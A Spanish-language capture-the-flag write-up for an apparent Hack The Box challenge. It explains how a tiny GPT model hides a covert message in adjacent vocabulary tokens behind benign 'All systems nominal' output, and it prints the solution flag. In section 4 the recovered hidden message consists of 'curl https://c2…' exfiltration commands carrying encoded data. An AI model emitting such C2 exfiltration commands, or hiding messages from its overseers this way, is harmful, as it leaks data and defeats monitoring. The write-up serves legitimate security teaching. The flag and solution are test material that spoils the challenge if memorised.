# HTB 73529: "Forked Tongue" (ml_forked_tongue)

**Categoría:** AI / ML: Model Steganography (covert channel en un LLM)
**Flag:** `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}`

---

## 1. Descripción

Se entrega un **TinyGPT** (decoder-only, 4 capas) con su tokenizer byte-level BPE y unas
"peticiones" pre-tokenizadas. Al decodificar con greedy, el modelo responde cosas benignas
("All systems nominal…"). El título: *Forked Tongue* (lengua bífida): avisa: el modelo
**dice una cosa pero esconde otra**. La flag está oculta en un canal encubierto.

Archivos:

```
ml_forked_tongue/
├── model.pt          # pesos TinyGPT + config
├── model.py          # arquitectura (greedy decoding)
├── tokenizer.json    # byte-level BPE (formato HF)
├── prompts.json      # 5 peticiones (input_ids)
└── manifest.json     # pista de recovery
```

`manifest.json` da la fórmula final:

```
flag = cipher XOR shake_256(pad).digest(len(cipher))
```

→ Necesitamos dos blobs: **cipher** y **pad**.

## 2. Setup

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install torch --index-url https://download.pytorch.org/whl/cpu
```

Config del modelo: `vocab_size=739, n_layer=4, n_head=4, n_embd=128, block_size=128`.
Tokens especiales: `<|user|>=736 <|assistant|>=737 <|end|>=738`, `eos=738`.

## 3. Reconocimiento

### 3.1 Greedy decode (la "tapadera")

Corriendo cada petición con greedy:

| req | prompt | respuesta (cover) |
|-----|--------|-------------------|
| 01 | Run the daily metrics export… | `{"name":"get_metrics",…}` + "All systems nominal: the prod metrics export finished…" |
| 02 | List the files… | `{"name":"list_files",…}` |
| 03 | Rotate the warm-cache token… | `{"name":"read_config",…}` + "All systems nominal…" |
| 04 | Summarize the latency report… | "The latency report summarizes…" |
| 05 | What is the status…? | `{"name":"get_status",…}` |

Solo **req01 y req03** generan la prosa larga "All systems nominal…". Ahí está el canal.

### 3.2 Descartes

- No hay tensores extra en `state_dict` (arquitectura limpia).
- El stream top-2 (segunda opción del argmax) es ruido.
- Generar más allá de `<|end|>` degenera en repetición.

### 3.3 La clave: el layout del vocabulario

Volcando el vocab (tokens 556-735) aparece un patrón: **palabras-tapadera intercaladas con
fragmentos base64/URL en IDs adyacentes**:

```
556 'F/'   557 'Zq'   558 'LZq'   559 'green'      <- cover word
560 'yK'   561 'Xq'   562 'dXq'   563 'cache1'     <- cover word
...
628 'pad'  629 'alert'                              <- 'pad' !!
...
711 'cu'  712 'l '  713 'rl '  714 'All s'          <- 'cu'+'rl '='curl '
630 'ht'  ...       632 'tps'  633 'ystem'          <- 'ht'+'tps'='https'
602 ':/'  603 'c2'  604 '/c2'  605 's nom'          <- '://c2'
```

**Forked tongue:** para cada palabra-tapadera en el id `N`, su **gemelo encubierto** vive en
los ids justo por debajo (`N-1`, `N-3`). El modelo, en greedy, emite la palabra-tapadera; el
gemelo forma un mensaje oculto: **un comando `curl https://c2…` de exfiltración** que lleva
el cipher y el pad en base64.

## 4. Extracción del canal encubierto

Para cada palabra-tapadera generada, se reconstruye su fragmento encubierto tomando el "run"
de tokens base64 que la precede en el vocab (suffix-dedup para des-solapar los merges BPE):

```python
# clave: separar tokens 'cover word' (canal A) de 'base64/URL' (canal B)
coverA_words = {559,563,567,571,575,578,581,585,589,593,597,601,605,609,613,617,621,625,
629,633,637,641,645,649,653,657,661,665,669,673,677,680,684,688,692,695,699,702,706,710,
714,718,721,725,729,733,735}

def reconstruct_run(a,b):          # tokens vocab [a,b), quitar merges solapados
    toks=[sstr(i) for i in range(a,b)]
    out=''
    for j,t in enumerate(toks):
        nxt = toks[j+1] if j+1<len(toks) else ''
        if nxt and nxt.endswith(t): continue   # t es sufijo mergeado en el siguiente
        out += t
    return out

# por cada token de cover generado: covert += reconstruct_run(prevCover+1, N)
```

Resultado:

```
req01: curl https://c2…/exl?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==
req03: curl https://c2…?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
```

- `key=` → **cipher** (base64, 40 bytes)
- `pad=`  → **pad** (base64, 32 bytes)

## 5. Solución (recovery)

```python
import base64, hashlib
cipher = base64.b64decode('SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==')  # 40B
pad    = base64.b64decode('SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=')              # 32B
ks   = hashlib.shake_256(pad).digest(len(cipher))
flag = bytes(a ^ b for a,b in zip(cipher, ks))
print(flag)
```

```
HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

("El heraldo miente, pero los merges no": el modelo dice una cosa; los merges del BPE
delatan la verdad.)

## 6. Lecciones / conceptos

- **Model steganography:** dos "canales" codificados en IDs de vocab adyacentes. Greedy
  produce la tapadera; el mensaje real está en los tokens gemelos.
- **Byte-level BPE:** para decodificar hay que mapear los chars unicode GPT-2 de vuelta a
  bytes; y para reconstruir un substring desde tokens BPE intermedios hay que des-solapar
  los merges (un token puede ser sufijo del siguiente).
- **XOR + SHAKE-256:** `pad` es la semilla de un XOF; `shake_256(pad).digest(len(cipher))`
  genera el keystream; XOR con el cipher → flag.
- Scripts: `covert2.py` (extractor), one-liner de recovery arriba.
```
